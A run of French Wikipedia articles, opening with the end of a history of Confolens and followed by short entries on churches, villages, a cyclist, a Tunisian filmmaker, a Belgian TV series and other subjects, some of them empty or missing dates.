Au , elle s'émancipe de la tutelle de Chabanais : les princes de Chabanais et Confolens étaient aussi devenus vidames de Chartres et sires de La Ferté-Vidame par le mariage en 1441 de Jean ou II de Vendôme († après 1460, vidame de Chartres en 1437) avec Catherine de Thouars (descendante d'Hugues II, dame de Chabanais et Confolens, Tiffauges et Pouzauges, veuve de Gilles de Rais) ; leur arrière-arrière-petit-fils le vidame François de Vendôme (1523-† décembre 1560) vend la principauté de Chabanais à Joachim de Monluc († 1567, frère cadet du maréchal Blaise de Monluc dont la postérité continuera les princes de Chabanais), mais sans Confolens ni Loubert. La baronnie de Confolens est alors acquise par Claude de Châteauvieux et Fromente († 1555), bailli de Bresse, suivi de son fils Joachim (1545-† sans alliance en mai 1614/1615 ; sire de Verjon, gouverneur de la Bastille, proche d'Henri III qui le fait chevalier du St-Esprit en 1583, et d'Henri IV qui le promeut "comte de Confolens" en 1604 ; fils de Claude de Châteauvieux et de Marie-Salomé de Montchenu de la Villatte). Joachim lègue à son neveu René de Vienne, fils de sa sœur Marie de Châteauvieux et de Marc de Vienne (1568-1598/1599 ; seigneur de Vauvillers) : Confolens passe ainsi dans la descendance de l'amiral de Vienne : les Vienne-Clervans puis les La Vieuville.
La baronnie qu'elle est devenue est érigée en comté en mars 1604 par le roi Henri IV en faveur de Joachim de Châteauvieux. Françoise-Marie de Vienne († 1669), fille de René et femme en 1649 du duc Charles II de La Vieuville transmet à son fils cadet Charles-Emmanuel de La Vieuville (vers 1655-† 1720), comte "de Vienne" et de Confolens, baron de la Villatte, marquis de St-Chamond par son mariage en 1684 avec Marie-Anne Mitte de Chevrières, frère puîné du duc René-François ; Charles-Emmanuel est suivi par son fils Charles-Louis-Joseph, père de Charles-Louis-Auguste (né en 1726), lui-même père d'autre Charles-Louis-Auguste de La Vieuville (né le 6 juin 1766).
Charles-Louis-Auguste II de La Vieuville « vivait le plus souvent à Paris et ne résida que très peu à Confolens et à la Villatte. Ruiné, il dut vendre la Villatte et le comté de Confolens le 16 février 1786 à Alexis-Benjamin-François Poute, marquis de Nieul-le-Virouil en Saintonge, qui décède à Poitiers l'année suivante. Ses terres reviennent alors à son frère, Claude Arnoul de Nieul, maréchal de camp, dont les biens furent saisis sous la Révolution, en 1792 ».
La construction des halles affirme son rôle de plaque tournante entre la côte qui fournit le sel, l'Angoumois et la Saintonge qui donnent leurs vins et le Limousin, fournisseur de cuir et de bois.
Au , trois établissements religieux importants sont construits en périphérie des zones alors urbanisées de Confolens : le couvent des Récollets, le couvent des Clarisses et la maison des sœurs de la Charité.
En 1714, l'élection de Confolens, jusqu'alors rattachée à la généralité de Limoges, revient à la généralité de Poitiers, alors que la baronnie de Champagne-Mouton quitte l'élection de Niort pour gagner celle de Confolens. Mais le faubourg du Goire reste dans la généralité de Limoges !
En 1764, le consulat de Confolens est supprimé et remplacé par une mairie et des échevins. Ces charges sont électives jusqu'en 1774, puis établies à titre d'offices. Une délibération du corps de la ville de Confolens, en date du 5 avril 1777, indique que le pont Vieux était toujours défendu par ses trois tours dites de Saint-Maxime, du Mi et de Saint-Barthélemy. Leurs vestiges en ont été démolis en 1777-1778, lors de réparations effectuées sur le pont. Côté sud, la ville était protégée par un rempart doublé d'un fossé, remblayé vers 1750-1760 pour faciliter le passage entre la rue Bournadour et l'ancienne paroisse Saint-Michel (le fossé est depuis devenu la rue des Buttes. La démolition des murailles vétustes et le comblement des fossés du quartier de la Fontorse et de Saint-Barthélemy furent décidés en 1771. Ces travaux permirent de donner du travail aux chômeurs des ateliers de charité et donnèrent naissance aux allées de Blossac, se terminant côté Vienne par un escalier monumental en arc de cercle.
En 1791, le tracé de la limite de la commune de Confolens, partagée jusqu'alors entre trois paroisses principales et deux évêchés, donne lieu à discussion. Plusieurs immeubles sont saisis ou vendus comme biens nationaux : l'hôtel Dassier-des-Brosses, le palais de l'Élection, le manoir des Comtes, le donjon, etc. La ville devient siège de sous-préfecture. Le 30 brumaire an II (20 novembre 1794), les titres et papiers rappelant les droits féodaux sont brûlés sur la place publique (acte transcrit par Babinet de Rencogne, 1865).
Le plan cadastral de 1826 nous donne un état de la ville avant les travaux importants qu'elle va connaître dans les trois décennies suivantes. La route principale passait alors par l'étroite rue du Soleil et sur le pont du Goire. Malgré la démolition du pont-levis et de la porte du Goire, ce passage restait trop étroit. Un nouveau pont est donc construit en aval en 1840 et la rue dite « du Pont-Larréguy » est percée à travers un îlot préexistant. Toujours dans le souci de faciliter la circulation, un plan d'alignement est dressé par l'agent-voyer Vincent en octobre 1840. Même s'il n'est définitivement approuvé qu'en 1873, les boutiques adossées à l'église Saint-Maxime et un petit îlot construit sur ce qui devient la place du Marché commencent à être démolis. Le reculement des façades sur la Grand-Rue, devenue rue du Maquis-Foch, prévue dès cette époque, n'interviendra finalement que plus tard. Dans un souci d'hygiène, dans les mêmes années 1840, le cimetière Saint-Maxime, situé à la confluence du Goire et de la Vienne, est transféré, avec le cimetière Saint-Barthélemy, à l'extérieur de la ville, et un abattoir, destiné à éviter les abattages par les boucheries dispersées dans la ville, est construit à cet emplacement.
En 1848, les Ateliers nationaux sont créés pour résorber le chômage en France. Dans ce cadre, il est décidé de construire un nouveau pont sur la Vienne, à l'amont du pont Vieux. Son emplacement est prévu à la sortie des escaliers monumentaux des allées de Blossac. L'afflux des ouvriers explique peut-être le pic démographique du recensement de 1851 (la population de Confolens passe de 2787 habitants en 1846 à 3113 en 1851, avant de redescendre à 2720 en 1861).
La construction d'édifices publics se poursuit : la sous-préfecture, jusqu'alors hébergée dans des locaux loués, est construite sur les plans d'Abadie en 1853, les prisons (près de l'actuel hôtel de ville) par le même architecte en 1857-1859, enfin le palais de justice, dont l'emplacement est longuement discuté, par l'architecte départemental Dubacq en 1868.
La gare de Confolens est inaugurée le 31 juillet 1887. Elle ne reçoit dans un premier temps que les trains venant de Roumazières et Angoulême (ligne Roumazières - Confolens). L'extension de la ligne vers Le Vigeant est ouverte le mai 1901, et c'est finalement en juillet 1913 que le tronçon du petit Mairat, tramway à vapeur sur voie étroite, permet une liaison supplémentaire de cinq heures d'Angoulême à Confolens par Saint-Angeau et Champagne-Mouton. Le secteur de la gare et l'entrée de ville vers Poitiers (rue Auguste-Duclaud) se développe à la fin du et au début du .
En 1891, la population de Confolens revient à habitants.
La préoccupation est alors de doter la ville de nouvelles halles couvertes, les anciennes s'étant progressivement effondrées au cours du . C'est finalement l'architecte Wiart qui est retenu, avec un projet à charpente métallique qui fit couler beaucoup d'encre. Situé à proximité de l'abattoir, le bâtiment est ouvert aux transactions fin 1893.
Après la Première Guerre mondiale, la population de Confolens s'effondre : si le conflit fit une centaine de victimes, la population perd près de 500 personnes entre les recensements de 1911 et 1921, passant de à .
Le principal chantier des années 1920 est le transfert de l'abattoir à l'extérieur de la ville, à proximité de la gare (actuels ateliers municipaux, dits « le casino »). Les prisons sont fermées en 1926. Par ailleurs, la ligne de chemin de fer Confolens - Le Vigeant est fermée au trafic voyageurs en 1938, mais le trafic de marchandises est maintenu jusqu'en 1978. La voie est déclassée en octobre 1979 et la section sud est désormais utilisée par l'association du Chemin de fer Charente-Limousine (qui y fait circuler des Vélos-rails).
Dans l'entre-deux-guerres, la population de Confolens remonte progressivement.
Dans les années 1950, un collège est construit près de Saint-Barthélemy, puis une nouvelle gendarmerie (1958). Dans les années 1960/1970, la ville profite de la prospérité des Trente Glorieuses et plusieurs projets importants sont menés à bien : le nouvel abattoir (1970/1978) (le plus important de France pour les caprins), les premiers lotissements (à partir de 1963 et surtout 1970), un nouveau lycée à l'extérieur de la ville (1973), la rocade de contournement de la ville (1976), la bibliothèque centrale de prêt (devenue annexe de la bibliothèque départementale de prêt de la Charente). Deux zones à vocation commerciales et industrielles voient le jour en périphérie de la ville, aux entrées nord-ouest (route de Niort) et sud (route de Limoges).
Politique et administration.
Liste des maires.
Jusqu'aux prochaines élections municipales de 2020, le conseil municipal de la nouvelle commune est constitué de tous les conseillers municipaux issus des conseils des anciennes communes.
Regroupement de 2016.
Le , à la suite de l'arrêté préfectoral du , la commune de Confolens a fusionné avec la commune voisine de Saint-Germain-de-Confolens, devenant ainsi une commune nouvelle.
Aire urbaine.
Depuis 2010, l'aire urbaine de Confolens regroupe les communes d'Ansac-sur-Vienne, Confolens, Esse et Lessac.
Politique environnementale.
Dans son palmarès 2024, le Conseil national de villes et villages fleuris de France a attribué trois fleurs à la commune.
Population et société.
Démographie.
Évolution démographique.
Les habitants sont les "Confolentais".
Pyramide des âges.
La population de la commune est relativement âgée.
En 2018, le taux de personnes d'un âge inférieur à s'élève à 24,9 %, soit en dessous de la moyenne départementale (30,2 %). À l'inverse, le taux de personnes d'âge supérieur à est de 44,5 % la même année, alors qu'il est de 32,3 % au niveau départemental.
En 2018, la commune comptait pour , soit un taux de 54,55 % de femmes, largement supérieur au taux départemental (51,59 %).
Les pyramides des âges de la commune et du département s'établissent comme suit.
Culture locale et patrimoine.
Les informations relatives au patrimoine de cette commune sont celles des deux communes fusionnées. Depuis 1958, chaque année, au mois d'août, le Festival de Confolens attire des milliers de touristes.

</doc>
<doc id="10576177" url="https://fr.wikipedia.org/wiki?curid=10576177" title="Marelli">
Marelli



</doc>
<doc id="10576196" url="https://fr.wikipedia.org/wiki?curid=10576196" title="Église Saint-Martin de Boismont">
Église Saint-Martin de Boismont

L'église Saint-Martin de Boismont est une église, protégée par les monuments historiques, située sur le territoire de la commune de Boismont, dans le département français de la Somme, non loin de la baie de Somme.
Historique.
La construction de l'église de Boismont remonte au .
Le culte protestant y fut pratiqué à plusieurs reprises à l'époque des guerres de religion.
Elle fut partiellement endommagée pendant la Campagne de France de mai-, au début de la Seconde Guerre mondiale.
La charpente et les voussures sont protégées au titre des monuments historiques : inscription par arrêté du .
Description.
L’église Saint-Martin de Boismont est construite en pierre, silex et brique. Le clocher-mur surmonte le portail, soutenu par deux contreforts.
L’intérieur conserve :

</doc>
<doc id="10576200" url="https://fr.wikipedia.org/wiki?curid=10576200" title="El Ensueño">
El Ensueño

 El Ensueño est une localité balnéaire uruguayenne située dans le département de Colonia.
Localisation.
Situé au sud du département de Colonia, El Ensueño se déploie à l'ouest de la station de Santa Ana, sur les rives du Río de la Plata. On y accède par un chemin vicinal, depuis le kilomètre 155 de la route 1.
Population.
La localité compte 19 habitants permanents d'après le recensement de 2011. Mais la population augmente en été, avec la saison touristique.

</doc>
<doc id="10576212" url="https://fr.wikipedia.org/wiki?curid=10576212" title="A7 (mixtape de SCH)">
A7 (mixtape de SCH)



</doc>
<doc id="10576242" url="https://fr.wikipedia.org/wiki?curid=10576242" title="J'irai dormir chez l'homme qui brûle">
J'irai dormir chez l'homme qui brûle



</doc>
<doc id="10576256" url="https://fr.wikipedia.org/wiki?curid=10576256" title="Unadilla (Nebraska)">
Unadilla (Nebraska)

Le village américain d’ est situé dans le comté d'Otoe, dans l’État du Nebraska. Sa population s’élevait à lors du recensement.

</doc>
<doc id="10576258" url="https://fr.wikipedia.org/wiki?curid=10576258" title="Église Notre-Dame de Bettencourt-Rivière">
Église Notre-Dame de Bettencourt-Rivière

L'église Notre-Dame de Bettencourt-Rivière est située dans le hameau de Rivière, sur le territoire de la commune de Bettencourt-Rivière, dans le département de la Somme, à l'ouest d'Amiens.
Historique.
Cette petite église de campagne dont les origines remontent au est protégée au titre des monuments historiques : inscription par arrêté du , modifié par arrêté du .
Caractéristiques.
L'église est construite en pierre et son toit est recouvert de tuiles. Elle se compose d'une nef et d'un chœur et ne possède pas de transept. L'entrée est surmontée d'un clocher-mur.
L'intérieur est voûté d'ogives et les piliers du chœur sont ornés de chapiteaux sculptés. L'église conserve quelques objets protégés en tant que monuments historiques :

</doc>
<doc id="10576278" url="https://fr.wikipedia.org/wiki?curid=10576278" title="Église Sainte-Marie de Berlin">
Église Sainte-Marie de Berlin

L'église Sainte-Marie ("St. Marien" ou "Marienkirche") est une église luthérienne-évangélique de Berlin située sur la Karl-Liebknecht-Straße, à proximité de la Fernsehturm, dans le quartier de Mitte. Avec l'église Saint-Nicolas, c'est l'un des plus anciens lieux de culte de la ville.
Elle est l'église principale de l'évêque de l'Église protestante Berlin-Brandebourg-Haute Lusace silésienne.
Historique.
Elle fut construite après 1250, à l'époque de la première vague d'extension de la ville de Berlin au Moyen Âge, comme église communale. De tous les lieux de culte édifiés à l'époque médiévale dans la capitale, Sainte-Marie est la seule qui ait gardé sa destination initiale.
Architecture.
C'est une église gothique comportant trois nefs, qui furent remodelées à l'époque baroque par Andreas Schlüter qui leur donna le caractère d'une salle de prêche en intégrant la chaire, la symbolique de l'architecture gothique cédant le pas à des considérations fonctionnelles.
Dans le sens d'un retour au gothique, Hermann Blankenstein ordonna finalement entre 1893 et 1894 de vastes travaux (comme par exemple sur la façade extérieure des bâtiments Sud, la tribune d'orgue ou le parquet) qui contribuèrent considérablement à donner à l'église son aspect actuel.

</doc>
<doc id="10576279" url="https://fr.wikipedia.org/wiki?curid=10576279" title="U-960">
U-960



</doc>
<doc id="10576281" url="https://fr.wikipedia.org/wiki?curid=10576281" title="U-616">
U-616



</doc>
<doc id="10576290" url="https://fr.wikipedia.org/wiki?curid=10576290" title="Unadilla">
Unadilla



</doc>
<doc id="10576293" url="https://fr.wikipedia.org/wiki?curid=10576293" title="Formule V8 3.5 2017">
Formule V8 3.5 2017

La Formule V8 3.5 2017 est la et dernière saison du championnat de Formule V8 3.5. Comportant 18 courses réparties en 9 manches, elle démarre le à Silverstone et se termine le à Sakhir. Il s'agit de la deuxième et dernière édition de Formule V8 3.5 (ex-Formule Renault 3.5 Series), au vu du faible nombre de participants.
Pour la première fois, le calendrier du championnat ne se limite pas qu'aux circuits européens, à la suite d'un accord avec le WEC.
Le Brésilien Pietro Fittipaldi, petit-fils du double-champion du monde de Formule 1 Emerson Fittipaldi, est sacré champion des pilotes. Son écurie Lotus remporte le championnat par équipes.
Écuries et pilotes.
Toutes les écuries disposent de châssis Dallara T12 équipés de moteurs V8 Zytek et chaussés de pneumatiques Michelin.
Classements de la saison 2017.
Système de points
Les points de la course sont attribués aux 10 premiers pilotes classés. Aucun point n'est attribué pour la pole position ni pour le meilleur tour en course. Ce système d'attribution des points est utilisé pour chaque course du championnat.

</doc>
<doc id="10576305" url="https://fr.wikipedia.org/wiki?curid=10576305" title="Traquet du Congo">
Traquet du Congo

Le Traquet du Congo ("Myrmecocichla tholloni") est une espèce de passereau de la famille des Muscicapidae.
Étymologie.
Son épithète spécifique est en l'honneur de (1855−1896), sous-chef de l’école de botanique au Muséum national d’histoire naturelle et collecteur de spécimens au Congo et au Gabon.
Répartition.
Son aire dissoute s'étend à travers le sud-ouest du bassin du Congo, le centre de l'Angola ainsi qu'en république centrafricaine.

</doc>
<doc id="10576307" url="https://fr.wikipedia.org/wiki?curid=10576307" title="Pour Voir Pas Vu">
Pour Voir Pas Vu



</doc>
<doc id="10576310" url="https://fr.wikipedia.org/wiki?curid=10576310" title="Sonia Chamkhi">
Sonia Chamkhi

Sonia Chamkhi est une réalisatrice, écrivaine et chercheuse en cinéma tunisienne. 
Biographie.
Sonia Chamkhi est titulaire d'un doctorat en cinéma, audiovisuel et télévision de l'université Panthéon-Sorbonne et a enseigné le design image et la pratique audiovisuelle à l'Institut supérieur des beaux-arts de Tunis. Elle est actuellement maîtresse de conférences à l'École supérieure de l'audiovisuel et du cinéma de Gammarth (ESAC, Tunisie).
À partir de 2003, elle réalise diverses fictions ("Normal" en 2002, "Borderline" en 2008 et "Narcisse" en 2015) et des documentaires ("Douz, la porte du Sahara" en 2003, "L'Art du mezoued" en 2010, "Militantes..." en 2012 et "Le Temps qui passe" en 2020).
Elle est récipiendaire du grand prix de la 52 édition du Festival international de femmes de Florence (Persona) pour son documentaire "Militantes..." en 2015, des trophées du meilleur long métrage de fiction (catégorie internationale) du FESTICAB (Burundi, 2016) et du FESTILAG (Côte d'Ivoire, 2018), ainsi que de la mention spéciale du jury à Cinéalma (France, 2016) pour "Narcisse". Ses films sont sélectionnés dans de nombreuses compétitions internationales dont le Festival de Cannes, les Journées cinématographiques de Carthage, le Festival international du film de Dubaï, le Festival du cinéma d'Afrique, d'Asie et d'Amérique latine de Milan, le Festival panafricain du cinéma et de la télévision de Ouagadougou ou le Festival international de films de femmes de Créteil.
Chercheuse et auteure littéraire, elle a écrit deux essais sur le cinéma tunisien, intitulés "Cinéma tunisien nouveau : parcours autres" en 2002 et "Le cinéma tunisien à la lumière de la modernité : études critiques de films tunisiens (1996-2006)" en 2009, et deux romans, "Leïla ou la femme de l'aube" en 2008 et "L'Homme du crépuscule" en 2012. Son premier roman remporte le prix Zoubeida-Bchir de la création féminine en 2008, le prix Comar du premier roman et la mention d'honneur du prix Noma de publication en Afrique en 2009.
Elle est membre du Parlement des écrivaines francophones.
Engagée sur la scène culturelle et artistique, elle préside en 2011 l'Association des réalisateurs de films tunisiens et siège au bureau directeur constitutif du Syndicat indépendant des réalisateurs producteurs en 2021.
En 2020, elle est nommée directrice générale du Centre national du cinéma et de l'image.
En , elle est nommée directrice générale des Journées cinématographiques de Carthage mais démissionne aussitôt après l'édition de novembre 2022. En , elle est membre du jury pour les courts métrages au Festival Aflam du Sud.

</doc>
<doc id="10576312" url="https://fr.wikipedia.org/wiki?curid=10576312" title="Giuseppe Pecchio">
Giuseppe Pecchio

Giuseppe Pecchio, né le à Milan et mort le à Brighton, est un homme politique, économiste et historien italien.
Biographie.
Noble milanais adepte des idées libérales, Giuseppe Pecchio travaille dans l'administration financière pendant la période du royaume d'Italie entre 1810 et 1814. Économiste, il collabore à la revue "Il Conciliatore" en 1818-1819.
Il doit quitter la Lombardie en 1821 pour éviter une arrestation et se réfugie en Espagne et puis à Londres 
Auteur d'une biographie controversée de Ugo Foscolo, publié en Angleterre, il se lie d'amitié avec le comte Luigi Porro Lambertenghi, mais n'a peu de relations avec les autres exilés 

</doc>
<doc id="10576317" url="https://fr.wikipedia.org/wiki?curid=10576317" title="Gerben Thijssen">
Gerben Thijssen

Gerben Thijssen (né le à Genk) est un coureur cycliste belge, membre de l'équipe Intermarché-Circus-Wanty. Sur piste, il est champion d'Europe de course à l'élimination en 2017.
Biographie.
En 2014, Gerben Thijssen remporte son premier titre national en devenant Champion de Belgique de l'omnium chez les débutants. Il monte également sur le podium dans d'autres disciplines. L'année suivante, il remporte ses premiers succès internationaux. Il termine troisième du championnat du monde junior de course aux points. Avec Robbe Ghys, il est vice-champion d'Europe de course à l'américaine juniors. En 2016, il est à nouveau deuxième de l'américaine aux championnats d'Europe Junior (avec Jules Hesters) et médaillé de la course aux points.
Lors de la deuxième manche de la Coupe du monde sur piste 2016-2017 à Apeldoorn, l'équipe de poursuite par équipes belge, composée de Thijssen, Moreno De Pauw, Kenny De Ketele, Robbe Ghys et Jonas Rickaert, prend la deuxième place. Lors des Six jours de Gand, Thijssen remporte la course des moins de 23 ans avec Hester. En octobre, il est à 19 ans champion d'Europe de course à l'élimination à Berlin.
En 2018, il devient champion de Belgique sur route espoirs (moins de 23 ans) et champion de Belgique du contre-la-montre par équipes. 
2019-2021 : Lotto-Soudal.
Au mois d'août 2018, il obtient un contrat de stagiaire avec la formation Lotto-Soudal. Peu après, il signe un contrat pour devenir professionnel à partir du avec l'équipe World Tour. En , il chute lourdement lors des Six jours de Gand et doit être hospitalisé en raison de trois côtes cassées et d'une fracture de la clavicule. Des hémorragies cérébrales plus petites ont également été détectées.
Il ne reprend la compétition qu'en août 2020. En septembre, il se classe deuxième au sprint de la Gooikse Pijl, derrière Danny van Poppel. En octobre, il participe au Tour d'Espagne 2020, son premier grand tour. Il termine deuxième de la neuvième étape derrière Pascal Ackermann, après la disqualification pour sprint dangereux du vainqueur initial, l'Irlandais Sam Bennett. Thijssen abandonne la course lors de la . Lors de la saison 2021, il décroche plusieurs tops 10 au sprint, dont une troisième place sur le Circuit du Houtland.
2022-2025 : Intermarché-Wanty-Gobert Matériaux.
Après deux ans et demi chez Lotto-Soudal, Thijssen rejoint l'équipe Intermarché-Wanty-Gobert Matériaux pour la saison 2022. Avec sa nouvelle équipe, il réalise la meilleure saison depuis ses débuts. Il remporte la dernière étape des Quatre Jours de Dunkerque, puis obtient plusieurs podiums : deuxième de la Veenendaal-Veenendaal Classic et troisième de la Marcel Kint Classic. En août, il remporte son premier succès sur le World Tour lors de la du Tour de Pologne. En fin d'année, il gagne la Gooikse Pijl.
Au printemps 2023, il remporte, au sprint, le Grand Prix Jean-Pierre Monseré et la Bredene Koksijde Classic. Grâce à ses bons résultats, le coureur voit son contrat prolongé jusqu'en 2025 au sein de l'équipe Intermarché-Wanty-Gobert Matériaux. Initialement sélectionné pour le Tour d'Espagne, Thijssen est contraint de renoncer à y participer à la veille du départ après avoir été testé positif au SARS-CoV-2.
2026- : Alpecin-Premier Tech.
Il quitte la formation Intermarché-Wanty à la fin de la saison cycliste 2025 pour rejoindre l’équipe Alpecin-Premier Tech.
Palmarès sur route.
Résultats sur les grands tours.
Tour de France.
1 participation
Tour d'Italie.
1 participation
Tour d'Espagne.
2 participations

</doc>
<doc id="10576318" url="https://fr.wikipedia.org/wiki?curid=10576318" title="Tour du Táchira 2017">
Tour du Táchira 2017

La édition du Tour du Táchira a eu lieu du 13 au . Elle fait partie du calendrier UCI America Tour 2017 en catégorie 2.2. Yonathan Salinas remporte le classement général après avoir gagné deux étapes.
Étapes.
Ce Tour du Táchira comporte dix étapes.
Classements finals.
Classements annexes.
Classement par points.
 Jonathan Monsalve
Classement du sprint.
 Fernando Briceño
Classement de la montagne.
 Yonathan Salinas
Classement des jeunes.
 Iván Sosa
Classement par équipes.
JHS Aves

</doc>
<doc id="10576322" url="https://fr.wikipedia.org/wiki?curid=10576322" title="Giuseppe Palanti">
Giuseppe Palanti

Giuseppe Palanti (né le à Milan, en Italie ; mort le dans la même ville) est un peintre, un illustrateur, un costumier, un metteur en scène et un professeur italien.

</doc>
<doc id="10576328" url="https://fr.wikipedia.org/wiki?curid=10576328" title="Professor T.">
Professor T.

« Professor T. » est une série policière flamande en deux saisons de treize épisodes diffusée sur La Une à partir de l’automne 2015. Le scénario est de Paul Piedfort, qui a déjà écrit ' et collaboré à '. Elle a été réalisée par Indra Siera, Tim Mielants et Gijs Polspoel.
Le tournage a commencé en . L'action se déroule à Anvers, où la plupart des enregistrements ont été effectués, certaines scènes ayant été enregistrées à Gand, au vieux palais de justice. La première saison s’appelait « "T. »", mais pour la deuxième saison, la série a été renommée en « "Professor T". ».
Histoire.
Jasper Teerlinck, alias « professor T. », est professeur de criminologie à l’université d’Anvers. La police fédérale lui propose de participer aux enquêtes en tant que consultant. Il va collaborer avec l'inspecteur Annelies Donckers, une de ses anciennes élèves.
Prix.
Au Festival de la fiction TV de La Rochelle 2015, "Professor T." a gagné le "prix spécial du jury pour la fiction étrangère".
International.
Au Royaume-Uni, la série originale est diffusée en 2017 par Channel 4 et reste accessible en ligne sous le programme de séries étrangères Walter Presents.
Adaptations.
L'adaptation française « "Prof T. »" produite en 2016 par Vema Productions avec Mathieu Bisson dans le rôle principal est diffusée en Belgique depuis le sur La Une, en Suisse le sur RTS Un et en France le sur TF1.
En Allemagne, les droits ont été acquis par la ZDF. La série allemande « "Professor T." »est produite par et y joue le rôle principal.

</doc>
<doc id="10576336" url="https://fr.wikipedia.org/wiki?curid=10576336" title="Jean Henri Hassenfratz">
Jean Henri Hassenfratz



</doc>
<doc id="10576342" url="https://fr.wikipedia.org/wiki?curid=10576342" title="Agence pour les affaires culturelles">
Agence pour les affaires culturelles



</doc>
<doc id="10576347" url="https://fr.wikipedia.org/wiki?curid=10576347" title="Heinrich Schweiger">
Heinrich Schweiger

Heinrich Schweiger (né le à Vienne, mort le à Salzbourg) est un acteur autrichien.
Biographie.
Heinrich Schweiger suit les cours du Max Reinhardt Seminar et fait ses débuts au théâtre en 1947. Il vient pour la première fois au Theater in der Josefstadt l'année suivante puis au Burgtheater en 1949 dont il intègre l'ensemble.
En 1956, il a un engagement au Bayerisches Staatsschauspiel à Munich puis au Théâtre de Düsseldorf. Il revient au Burgtheater en 1961 et tient de grands rôles.
Au festival de Salzbourg, il interprète pendant douze ans le Diable ou Mammon.
Au cinéma, Heinrich Schweiger joue dans de très différentes productions. Le plus souvent, il joue des personnages de haut rang comme Napoléon Bonaparte ou le Pape.
Schweiger épouse en troisièmes noces en 1983 la journaliste Ursula Stenzel.

</doc>
<doc id="10576356" url="https://fr.wikipedia.org/wiki?curid=10576356" title="Palmyra (Nebraska)">
Palmyra (Nebraska)

 est un village américain situé dans le comté d'Otoe, dans l’État du Nebraska. Sa population s’élevait à lors du recensement.
Histoire.
Palmyra a été établie en 1870. Son nom commémore l’ancienne cité de Palmyre.

</doc>
<doc id="10576357" url="https://fr.wikipedia.org/wiki?curid=10576357" title="Famille de Ranst-Berchem">
Famille de Ranst-Berchem

La famille de Ranst-Berchem est une ancienne famille noble féodale du duché de Brabant, à laquelle appartenait les seigneurs de Ranst et de Berchem. Une branche de la famille subsiste encore en Suisse romande.
Historique.
Origines.
Les Ranst-Berchem sont une branche cadette de la famille Berthout. Ce rattachement serait à attribuer à un certain Godefroid, seigneur de Ranst (village que traversait l’ancienne voie d’Anvers à Herentals) qui vécut dans la seconde moitié du . Ce rattachement n'a pas été formellement prouvé mais est tiré d'un faisceau d'indices convergents : utilisation des mêmes prénoms, mention des liens de consanguinité dans des actes plus tardifs, cri de guerre commun, et enchevêtrement des terres, fiefs et droits féodaux détenus par les deux familles.
Branche de Ranst de Berchem de Saint Brisson.
Louis de Ranst de Berchem (1831-1895) épouse le 25 août 1863 Marie Séguier de Saint Brisson (1845-1911), héritière des marquis de Saint Brisson. Leurs descendants relèvent de nom maternel et adoptent dès lors le nom "de Ranst de Berchem de Saint Brisson".
Alliances.
Les principales alliances de la branche de Saint Brisson sont : Henrys d'Aubigny d'Esmyards (1886 et 1919), Marc de Saint-Pierre (1892), de Secondat de Montesquieu (1897), della Faille de Leverghem (1913), etc.
Héraldique.
Leur blasonnement est : "d'argent à trois pals de gueules" et leur cri : .
La famille brisa ses armes de diverses manières en :
D'autres van Berchem accostaient leur cimier de deux paires de besicles.

</doc>
<doc id="10576358" url="https://fr.wikipedia.org/wiki?curid=10576358" title="Orlinek">
Orlinek

Orlinek est un tremplin de saut à ski, situé à Karpacz en Pologne.
Historique.
C'est en 1912 que le premier tremplin à Karpacz (alors Krummhübel, Empire Allemand) a été construit sous le nom de "Schneekoppenschanze". Durant son existence il a été agrandi deux fois. Son dernier record de 45,5 m a été établi en 1938 par Karl-Heinz Breiter. Pendant la Seconde Guerre mondiale le tremplin est abandonné et détruit. Après la fin des hostilités, quand Karpacz est devenue polonaise un second tremplin est érigé sous la direction de Stanisław Marusarz. Le nouveau site reçoit le nom d'Orlinek. En 1962 la construction s'écroule pendant une tempête. Une installation toute neuve de K-73 est mise en place en 1978. Ce nouveau tremplin est complètement modernisé en 2000 pour les championnats du monde junior de ski nordique, un ascenseur et des nouveaux postes pour les juges sont installés.

</doc>
<doc id="10576361" url="https://fr.wikipedia.org/wiki?curid=10576361" title="Xyris">
Xyris

Xyris est un genre de plantes à fleurs de la famille des "Xyridaceae".

</doc>
<doc id="10576367" url="https://fr.wikipedia.org/wiki?curid=10576367" title="Équipe d'Algérie de football à la Coupe d'Afrique des nations 2017">
Équipe d'Algérie de football à la Coupe d'Afrique des nations 2017

Cet article relate le parcours de l’Équipe d'Algérie de football lors de la Coupe d'Afrique des nations de football 2017 organisée en Gabon du au .
Effectif.
Le sélectionneur choisit dans un premier temps trente-et-un joueur à la fin du mois de décembre. La liste définitive est ensuite rendue publique le , sans Carl Medjani ni Sofiane Feghouli. À trois jours du début de la compétition, Saphir Taïder se blesse et est remplacé par Ismaël Bennacer.

</doc>
<doc id="10576369" url="https://fr.wikipedia.org/wiki?curid=10576369" title="Sauce Reform">
Sauce Reform

La sauce Reform, ou "Reform sauce" en anglais, est une variante anglaise de la sauce poivrade, plus adaptée à l'accompagnement de gibiers.
Basée et inspirée sur la sauce poivrade, elle est agrémentée de champignons et de truffe noire.
Elle a été inventée aux environs de 1830 par Alexis Soyer du Reform Club situé à Pall Mall à Londres.

</doc>
<doc id="10576378" url="https://fr.wikipedia.org/wiki?curid=10576378" title="Église Saint-Vincent de Bertangles">
Église Saint-Vincent de Bertangles

L'église Saint-Vincent de Bertangles est située à Bertangles, dans le département de la Somme au nord d'Amiens.
Historique.
L'église était, à l'origine, selon toute vraisemblance, la chapelle du château. Son histoire est liée à celle des seigneurs de Bertangles, comme témoignent les armoiries qui ornent le bâtiment. Le début de la construction remonte certainement avant 1611 date de l’arrivée de la famille de Clermont-Tonnerre à Bertangles, car dans la nef, partie la plus ancienne de l'église, deux clefs de voûte portent les armes de la famille de Glizy. Le début de la construction de l'église remonterait donc à la fin du ou au tout début du siècle.
L´église fut agrandie, en 1846, les travaux étant financés par la famille de Clermont-Tonnerre et la famille de Chauvelin. Un chœur à deux bas-côtés fut édifié sur les plans de l'architecte parisien A. Goze. C'est l'un des premiers exemples de construction néo-gothique d'une église rurale. Une chapelle privée fut construite pour les Clermont-Tonnerre ainsi qu'une chapelle funéraire. La nef voûtée de bois, en forme de carène de bateau, a été restaurée en 1984. L'édifice est protégé au titre des monuments historiques : inscription par arrêté du .
Caractéristiques.
Le bâtiment est construit en brique et pierre avec lits de brique et de pierre alternés. On y distingue deux parties : la nef plus basse que le chœur datant du siècle et le chœur reconstruit en style néo-gothique.
À l’intérieur on peut admirer dans le bas-côté gauche se trouve un monument en pierres élevé en 1852 par les frères Duthoit en style néo-renaissance. Ce monument a été érigé à la mémoire de Julian de Clermont-Tonnerre et de son épouse Claude de Rohan. Près du monument, sous la chapelle privée, se trouve la crypte funéraire de la famille de Clermont-Tonnerre.
